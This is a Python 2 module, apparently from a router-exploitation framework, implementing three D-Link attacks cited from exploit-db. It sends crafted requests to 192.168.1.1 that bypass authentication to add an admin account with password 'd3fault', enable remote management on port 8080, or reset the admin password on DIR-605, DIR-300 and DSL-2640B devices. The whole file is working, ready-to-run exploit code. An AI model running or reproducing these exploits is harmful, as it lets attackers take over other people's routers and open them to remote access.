from util import Msg, Error, debug
import urllib

#
# dlink vulnerabilities
#

#
# run the specified vuln
#
def run ( run ):
	if run == 1:
		# http://www.exploit-db.com/exploits/18638/

		print '[+] Adding admin \'admin\' with password \'d3fault\'...'
		url = 'http://192.168.1.1:80/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
		params = urllib.urlencode({'ACTION_POST':1, 'admin_name':'admin', 'admin_password1':'d3fault',
									'admin_password2':'d3fault'})
		try:
			response = urllib.urlopen(url, params)
		except Exception, j:
			Error('Error connecting to host.')
			return
		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
		print '[!] Page returned: '
		print response.read()

	elif run == 2:
		# http://www.exploit-db.com/exploits/15753/

		print '[+] Adding admin \'admin\' with password \'d3fault\'...'
		url = 'http://192.168.1.1:80/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
		params = urllib.urlencode({'ACTION_POST':1, 'admin_name':'admin',
								   'admin_password1':'d3fault','admin_password2':'d3fault',
								   'rt_enable_h':1, 'rt_port':8080, 'rt_ipaddr':'192.168.0.1337'})
		try:
			response = urllib.urlopen(url, params)
		except Exception, j:
			Error('Error connecting to host.')
			return
		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
		print '[!] Page returned: '
		print response.read()

	elif run == 3:
		# http://www.exploit-db.com/exploits/18499/

		print '[+] Changing \'admin\' password to \'d3fault\'...' 
		url = 'http://192.168.1.1:80/redpass.cgi?sysPassword=d3fault&change=1'		
		try:
			response = urllib.urlopen(url)
		except Exception, j:
			Error('Error connecting to host.')
			return
		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
		print '[!] Page returned: '
		print response.read()
#
# router:vuln
#
def vulnerabilities():
	return [ 'DIR-605 v2.0 - Add Admin',
			 'DIR-300 v1.04 - Add Admin',
			 'DSL-2640B - Change Admin Password',
			]
